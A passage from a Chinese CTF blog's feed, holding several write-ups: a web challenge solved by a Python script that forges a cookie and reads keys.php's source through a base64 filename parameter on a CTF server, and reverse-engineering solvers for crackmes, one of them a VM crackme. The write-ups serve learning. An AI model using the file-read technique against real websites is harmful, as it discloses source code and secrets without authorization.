class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>逻辑不难，要求我们将cookie设置成margin=margin，然后在用相同的办法读取keys.php</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=%s"</span>%(i,b64encode(<span class="string">"keys.php"</span>))</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">"Cookie"</span>: <span class="string">"margin=margin"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = get(url=url,headers=header)</span><br><span class="line">    <span class="keyword">print</span> res.text</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $key=<span class="string">'KEY&#123;key_keys&#125;'</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>得到flag：KEY{key_keys}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jactf-reverse3</title>
      <link href="/%E6%8E%98%E5%AE%89RE_crypto.html"/>
      <url>/%E6%8E%98%E5%AE%89RE_crypto.html</url>
      
        <content type="html"><![CDATA[<h3 id="RE-crypto"><a href="#RE-crypto" class="headerlink" title="RE_crypto"></a>RE_crypto</h3><p><img src="/images/pasted-109.png" alt="upload successful"></p><h4 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h4><p><img src="/images/pasted-110.png" alt="upload successful"></p><p><img src="/images/pasted-111.png" alt="upload successful"></p><blockquote><p>程序逻辑不难，输入的字符作为unk_4021A0数组的下标，定位该下标所对应的值，与((v11 + v12) ^ 0x19)比较，这个值是可以自己算出来的</p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">byte1=[<span class="number">0x32</span>,<span class="number">0x61</span>,<span class="number">0x34</span>,<span class="number">0x39</span>,<span class="number">0x66</span>,<span class="number">0x36</span>,<span class="number">0x39</span>,<span class="number">0x63</span>,<span class="number">0x33</span>,<span class="number">0x38</span>,<span class="number">0x33</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x39</span>,<span class="number">0x36</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x39</span>,<span class="number">0x36</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x66</span>,<span class="number">0x34</span>,<span class="number">0x65</span>,<span class="number">0x30</span>,<span class="number">0x32</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x38</span>,<span class="number">0x34</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x31</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x34</span>,<span class="number">0x38</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x36</span>,<span class="number">0x65</span>,<span class="number">0x32</span>,<span class="number">0x64</span>,<span class="number">0x61</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x37</span>,<span class="number">0x38</span>,<span class="number">0x36</span>,<span class="number">0x65</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x64</span>,<span class="number">0x35</span>,<span class="number">0x61</span>,<span class="number">0x64</span>,<span class="number">0x61</span>,<span class="number">0x65</span>,<span class="number">0x36</span>]</span><br><span class="line"></span><br><span class="line">byte = [ <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>, <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line"></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(byte1),<span class="number">2</span>):</span><br><span class="line">    v9 = <span class="number">0</span></span><br><span class="line">    v10 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> byte1[i] &lt; <span class="number">48</span> <span class="keyword">or</span> byte1[i] &gt; <span class="number">57</span>:</span><br><span class="line">        v9 = byte1[i] - <span class="number">87</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v9 = byte1[i] - <span class="number">48</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> byte1[i+<span class="number">1</span>] &lt; <span class="number">48</span> <span class="keyword">or</span> byte1[i+<span class="number">1</span>] &gt; <span class="number">57</span>:</span><br><span class="line">        v10 = byte1[i+<span class="number">1</span>] - <span class="number">87</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v10 = byte1[i+<span class="number">1</span>] - <span class="number">48</span></span><br><span class="line">    flag = (<span class="number">16</span>*v9+v10) ^ <span class="number">0x19</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(byte)):</span><br><span class="line">        <span class="keyword">if</span> flag == byte[j]:</span><br><span class="line">            ans += chr(j)</span><br><span class="line"><span class="keyword">print</span> ans</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>看了encrypt，只理解了一小部分，后面的部分实在不太明白到底是干嘛，还是太菜了，近几天做的逆向题目，让我深刻认识到密码学、算法(acm)在逆向中的重要地位，一步一个jio印吧……</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> jactf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次控制流平坦化逆向</title>
      <link href="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%E9%80%86%E5%90%91.html"/>
      <url>/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%E9%80%86%E5%90%91.html</url>
      
        <content type="html"><![CDATA[<h3 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h3><p><img src="/images/pasted-97.png" alt="upload successful"></p><blockquote><p>是控制流平坦化的题目</p></blockquote><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p><img src="/images/pasted-98.png" alt="upload successful"></p><blockquote><p>可以分析出函数的5个主要函数</p></blockquote><p><img src="/images/pasted-99.png" alt="upload successful"></p><blockquote><p>fun_check1(char *a1) 主要作用是检查输入字符串长度</p></blockquote><p><img src="/images/pasted-100.png" alt="upload successful"></p><blockquote><p>fun_check1(char *a1) 主要作用是检查输入前五个字节是否为flag{</p></blockquote><p><img src="/images/pasted-101.png" alt="upload successful"></p><blockquote><p>fun_check3(char *a1) 主要作用是检查输入的最后一个字节是否为}</p></blockquote><p><img src="/images/pasted-102.png" alt="upload successful"></p><blockquote><p>fun_check4(char *a1) 主要作用是检查输入的几个特殊部位的值是否为—</p></blockquote><p><img src="/images/pasted-103.png" alt="upload successful"></p><p><img src="/images/pasted-104.png" alt="upload successful"></p><p><img src="/images/pasted-105.png" alt="upload successful"></p><blockquote><p>输入的字符串进行加密后与字符串进行比较</p></blockquote><p><img src="/images/pasted-106.png" alt="upload successful"></p><blockquote><p>这就是比较的那个字符串 J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB</p></blockquote><blockquote><p>循环判断输入的每一位是否小于’0’或者大于’9’，如果满足条件，就判断是否等于’-‘，如果等于这个位置的字符就不变，如果大于’a’并且小于’z’，这个位置的字符串就减去48，其余的所有情况都进行将本位置的字符加上17</p></blockquote><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">"J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB"</span></span><br><span class="line"><span class="keyword">print</span> len(flag)</span><br><span class="line">strs = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">        temp = <span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> j &lt; ord(<span class="string">"0"</span>) <span class="keyword">or</span> j &gt; ord(<span class="string">"9"</span>):</span><br><span class="line">            <span class="keyword">if</span> j == ord(<span class="string">"-"</span>):</span><br><span class="line">                temp = chr(j)</span><br><span class="line">            <span class="keyword">elif</span> j &gt;= ord(<span class="string">'a'</span>) <span class="keyword">and</span> j &lt;= ord(<span class="string">"z"</span>):</span><br><span class="line">                temp = chr(j<span class="number">-48</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp = chr(j+<span class="number">17</span>)</span><br><span class="line">        <span class="keyword">if</span> temp == flag[i]:</span><br><span class="line">            strs += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> strs</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> flat </tag>
            
            <tag> ollvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次简单的VM程序逆向</title>
      <link href="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84VM%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91.html"/>
      <url>/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84VM%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91.html</url>
      
        <content type="html"><![CDATA[<h3 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h3><p><a href="http://malwaretech.com/downloads/vm1.zip" target="_blank" rel="noopener">vm crackme</a></p><p><img src="/images/pasted-91.png" alt="upload successful"></p><blockquote><p>程序给了三个文件，主要是要求我们通过分析vm1.exe文件的虚拟机，然后自己实现虚拟机，执行ram.bin中的opcode</p></blockquote><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/images/pasted-93.png" alt="upload successful"></p><blockquote><p>程序先申请一个堆，然后将unk_404040copy到Dst中，进而执行sub_4022e0_</p></blockquote><p><img src="/images/pasted-94.png" alt="upload successful"></p><blockquote><p>依次取出Dst中的数据，然后调用sub_402270，可知255之后的数据是opcode，255之前的数据是data</p></blockquote><p><img src="/images/pasted-95.png" alt="upload successful"></p><blockquote><p>这就是opcode执行的主要函数</p></blockquote><h3 id="实现自己的虚拟机"><a href="#实现自己的虚拟机" class="headerlink" title="实现自己的虚拟机"></a>实现自己的虚拟机</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">"./ram.bin"</span>,<span class="string">"rb"</span>)</span><br><span class="line">opcode = list(f.read())</span><br><span class="line"></span><br><span class="line">data = opcode[:<span class="number">0xff</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(data)):</span><br><span class="line">    data[i] = ord(opcode[i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_402270</span><span class="params">(v0,v1,v2)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> byte</span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">1</span>:</span><br><span class="line">        data[v1] = v2;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"mov data[%d], 0x%x"</span>%(v1,v2)</span><br><span class="line">    <span class="keyword">elif</span> v0 == <span class="number">2</span>:</span><br><span class="line">        byte = data[v1]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"mov rax, data[%d]"</span>%v1</span><br><span class="line">    <span class="keyword">elif</span> v0 == <span class="number">3</span>:</span><br><span class="line">        data[v1] = data[v1] ^ byte</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"xor data[%d], rax"</span>%v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(opcode)<span class="number">-257</span>,<span class="number">3</span>):</span><br><span class="line">    v0 = opcode[<span class="number">255</span>+i]</span><br><span class="line">    v1 = opcode[<span class="number">256</span>+i]</span><br><span class="line">    v2 = opcode[<span class="number">257</span>+i]</span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    sub_402270(ord(v0),ord(v1),ord(v2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> data)</span><br></pre></td></tr></table></figure><h3 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">mov data[29], 0xbd</span><br><span class="line">mov data[5], 0x53</span><br><span class="line">mov data[18], 0x48</span><br><span class="line">mov data[16], 0xe6</span><br><span class="line">mov data[19], 0x8a</span><br><span class="line">mov data[13], 0x47</span><br><span class="line">mov data[22], 0x13</span><br><span class="line">mov data[10], 0x15</span><br><span class="line">mov data[0], 0x98</span><br><span class="line">mov data[2], 0x3c</span><br><span class="line">mov data[24], 0xd9</span><br><span class="line">mov data[26], 0x57</span><br><span class="line">mov data[6], 0xab</span><br><span class="line">mov data[27], 0xc6</span><br><span class="line">mov data[1], 0x32</span><br><span class="line">mov data[23], 0x20</span><br><span class="line">mov data[21], 0x6f</span><br><span class="line">mov data[17], 0x2d</span><br><span class="line">mov data[8], 0xc9</span><br><span class="line">mov data[9], 0xe7</span><br><span class="line">mov data[3], 0x12</span><br><span class="line">mov data[12], 0x2f</span><br><span class="line">mov data[14], 0x88</span><br><span class="line">mov data[25], 0x6c</span><br><span class="line">mov data[4], 0x65</span><br><span class="line">mov data[30], 0xae</span><br><span class="line">mov data[20], 0x59</span><br><span class="line">mov data[31], 0x91</span><br><span class="line">mov data[28], 0x5d</span><br><span class="line">mov data[15], 0xae</span><br><span class="line">mov data[11], 0x15</span><br><span class="line">mov data[7], 0xcc</span><br><span class="line">mov rax, data[32]</span><br><span class="line">xor data[0], rax</span><br><span class="line">mov rax, data[33]</span><br><span class="line">xor data[1], rax</span><br><span class="line">mov rax, data[34]</span><br><span class="line">xor data[2], rax</span><br><span class="line">mov rax, data[35]</span><br><span class="line">xor data[3], rax</span><br><span class="line">mov rax, data[36]</span><br><span class="line">xor data[4], rax</span><br><span class="line">mov rax, data[37]</span><br><span class="line">xor data[5], rax</span><br><span class="line">mov rax, data[38]</span><br><span class="line">xor data[6], rax</span><br><span class="line">mov rax, data[39]</span><br><span class="line">xor data[7], rax</span><br><span class="line">mov rax, data[40]</span><br><span class="line">xor data[8], rax</span><br><span class="line">mov rax, data[41]</span><br><span class="line">xor data[9], rax</span><br><span class="line">mov rax, data[42]</span><br><span class="line">xor data[10], rax</span><br><span class="line">mov rax, data[43]</span><br><span class="line">xor data[11], rax</span><br><span class="line">mov rax, data[44]</span><br><span class="line">xor data[12], rax</span><br><span class="line">mov rax, data[45]</span><br><span class="line">xor data[13], rax</span><br><span class="line">mov rax, data[46]</span><br><span class="line">xor data[14], rax</span><br><span class="line">mov rax, data[47]</span><br><span class="line">xor data[15], rax</span><br><span class="line">mov rax, data[48]</span><br><span class="line">xor data[16], rax</span><br><span class="line">mov rax, data[49]</span><br><span class="line">xor data[17], rax</span><br><span class="line">mov rax, data[50]</span><br><span class="line">xor data[18], rax</span><br><span class="line">mov rax, data[51]</span><br><span class="line">xor data[19], rax</span><br><span class="line">mov rax, data[52]</span><br><span class="line">xor data[20], rax</span><br><span class="line">mov rax, data[53]</span><br><span class="line">xor data[21], rax</span><br><span class="line">mov rax, data[54]</span><br><span class="line">xor data[22], rax</span><br><span class="line">mov rax, data[55]</span><br><span class="line">xor data[23], rax</span><br><span class="line">mov rax, data[56]</span><br><span class="line">xor data[24], rax</span><br><span class="line">mov data[25], 0x0</span><br><span class="line">FLAG&#123;VMS-ARE-FOR-MALWARE&#125;W�]����~&#125;U��GP���`�.Ae�</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p> 第一次逆向vm程序，初次体验了被vm虐哭的感觉</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> vm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>so库移植</title>
      <link href="/so%E5%BA%93%E7%A7%BB%E6%A4%8D.html"/>
      <url>/so%E5%BA%93%E7%A7%BB%E6%A4%8D.html</url>
      
        <content type="html"><![CDATA[<h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><blockquote><p>攻防世界 pingpong</p></blockquote><h3 id="jadx"><a href="#jadx" class="headerlink" title="jadx"></a>jadx</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 